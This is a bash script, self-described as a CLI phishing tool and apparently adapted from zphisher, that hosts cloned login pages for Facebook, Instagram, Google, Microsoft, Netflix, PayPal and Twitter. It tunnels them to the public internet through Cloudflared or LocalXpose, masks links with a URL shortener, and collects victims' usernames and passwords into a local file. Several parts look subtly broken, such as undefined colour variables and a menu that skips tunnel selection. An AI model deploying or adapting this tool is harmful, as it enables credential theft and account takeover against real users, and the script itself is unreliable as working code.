#!/bin/bash

# Quishing - Phishing Tool via CLI

__version__="2.3.5"

## Default Host and Port
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (for output)
RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')"  
RESET="$(printf '\033[0m')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

## Ensure required directories exist
mkdir -p ".server"
mkdir -p "auth"
mkdir -p ".server/www"

## Trap exit signals
trap 'printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted."; exit 0' SIGINT SIGTERM

## Function to reset terminal colors
reset_color() {
    tput sgr0
    tput op
    return
}

## Kill any already running processes
kill_pid() {
    processes="php cloudflared loclx"
    for process in ${processes}; do
        if pidof ${process} > /dev/null; then
            killall ${process}
        fi
    done
}

## Check for updates
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
    release_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
    new_version=$(curl -s "${release_url}" | grep '"tag_name":' | awk -F\" '{print $4}')

    if [[ $new_version != $__version__ ]]; then
        echo -e "${ORANGE}Update found\n${WHITE}"
        sleep 2
        echo -e "${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
        curl -sL "https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz" -o update.tar.gz
        tar -xf update.tar.gz -C "$BASE_DIR" --strip-components 1
        rm -f update.tar.gz
        echo -e "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run the tool again.\n"
        exit 0
    else
        echo -e "${GREEN}Up to date\n"
    fi
}

## Check Internet connection
check_status() {
    echo -ne "${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}Online${WHITE}"
        check_update
    else
        echo -e "${RED}Offline${WHITE}"
    fi
}

## Banner
banner() {
    cat <<- EOF
		${CYAN}
		____  _    ____ _     ___  _     
		|  _ \| |  | ___| |   / _ \| |    
		| | | | |  | |__| |  | | | | |    
		| |_| | |__| |___| |__| |_| | |___
		|____/|____|_____|_____\___/|_____|

		${RED}Version: ${__version__}${WHITE}
	EOF
}

## Install dependencies
dependencies() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    pkgs=(php curl unzip)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"
            if [[ $(command -v pkg) ]]; then
                pkg install "$pkg" -y
            elif [[ $(command -v apt) ]]; then
                sudo apt install "$pkg" -y
            elif [[ $(command -v pacman) ]]; then
                sudo pacman -S "$pkg" --noconfirm
            else
                echo -e "\n${RED}[${WHITE}!${RED}] Unsupported package manager. Install packages manually."
                exit 1
            fi
        fi
    done
}

## Download necessary files for phishing/tunneling
download() {
    url="$1"
    output="$2"
    file=$(basename $url)
    if [[ -e "$file" || -e "$output" ]]; then
        rm -rf "$file" "$output"
    fi
    curl -sL "$url" -o "$file"
    mv "$file" ".server/$output"
    chmod +x ".server/$output"
}

## Install Cloudflared
install_cloudflared() {
    if [[ ! -e ".server/cloudflared" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."
        arch=$(uname -m)
        case $arch in
            *arm*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared';;
            *aarch64*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared';;
            *x86_64*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared';;
            *) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared';;
        esac
    fi
}

## Install LocalXpose
install_localxpose() {
    if [[ ! -e ".server/loclx" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."
        arch=$(uname -m)
        case $arch in
            *arm*) download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx';;
            *aarch64*) download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx';;
            *x86_64*) download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx';;
            *) download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx';;
        esac
    fi
}

## Setup phishing website
setup_site() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."
    cp -rf ".sites/$website/"* ".server/www/"
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Capture credentials
capture_creds() {
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
}

## Handle tunnel options
start_tunnel() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Starting tunnel..."
    case $tunnel in
        1) start_localhost ;;
        2) start_cloudflared ;;
        3) start_localxpose ;;
        *) echo -e "${RED}Invalid option!"; exit 1 ;;
    esac
}

## Start localhost
start_localhost() {
    setup_site
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hosted on: http://$HOST:$PORT"
    capture_creds
}

## Start Cloudflared
start_cloudflared() {
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing Cloudflared..."
    ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    sleep 8
       cld_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
    if [[ -n "$cld_url" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared URL: ${CYAN}$cld_url"
        capture_creds
    else
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to create Cloudflared tunnel."
        exit 1
    fi
}

## Start LocalXpose
start_localxpose() {
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing LocalXpose..."
    ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
    sleep 12
    loclx_url=$(grep -o 'https://[0-9a-zA-Z.]*.loclx.io' ".server/.loclx")
    if [[ -n "$loclx_url" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} LocalXpose URL: ${CYAN}$loclx_url"
        capture_creds
    else
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to create LocalXpose tunnel."
        exit 1
    fi
}

## Main menu for selecting phishing sites
main_menu() {
    clear
    banner
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Select a Phishing Site ${RED}[${WHITE}::${RED}]${ORANGE}\n"
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Facebook
        ${RED}[${WHITE}02${RED}]${ORANGE} Instagram
        ${RED}[${WHITE}03${RED}]${ORANGE} Google
        ${RED}[${WHITE}04${RED}]${ORANGE} Microsoft
        ${RED}[${WHITE}05${RED}]${ORANGE} Netflix
        ${RED}[${WHITE}06${RED}]${ORANGE} PayPal
        ${RED}[${WHITE}07${RED}]${ORANGE} Twitter
        ${RED}[${WHITE}08${RED}]${ORANGE} Custom URL Shortener
        ${RED}[${WHITE}00${RED}]${ORANGE} Exit
    EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice

    case $choice in
        1|01) website="facebook"; start_tunnel ;;
        2|02) website="instagram"; start_tunnel ;;
        3|03) website="google"; start_tunnel ;;
        4|04) website="microsoft"; start_tunnel ;;
        5|05) website="netflix"; start_tunnel ;;
        6|06) website="paypal"; start_tunnel ;;
        7|07) website="twitter"; start_tunnel ;;
        8|08) custom_shortener ;;
        0|00) echo -e "${GREEN}[${WHITE}-${GREEN}]${CYAN} Exiting..."; exit 0 ;;
        *) echo -e "\n${RED}[${WHITE}!${RED}] Invalid Option!"; main_menu ;;
    esac
}

## URL Shortener (for custom URL masking)
custom_shortener() {
    read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter the URL to shorten: ${WHITE}" url
    short_url=$(curl -s https://is.gd/create.php?format=simple&url="$url")
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Shortened URL: ${CYAN}$short_url"
    main_menu
}

## Start the main flow
start_tunnel_menu() {
    clear
    banner
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Select Tunnel Method ${RED}[${WHITE}::${RED}]\n"
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
        ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared
        ${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose
        ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
    EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" tunnel

    case $tunnel in
        1|01) start_localhost ;;
        2|02) start_cloudflared ;;
        3|03) start_localxpose ;;
        0|00) main_menu ;;
        *) echo -e "\n${RED}[${WHITE}!${RED}] Invalid Option!"; start_tunnel_menu ;;
    esac
}

## Start the tool
main() {
    clear
    banner
    dependencies
    check_status
    install_cloudflared
    install_localxpose
    main_menu
}

# Start the script
kill_pid
main

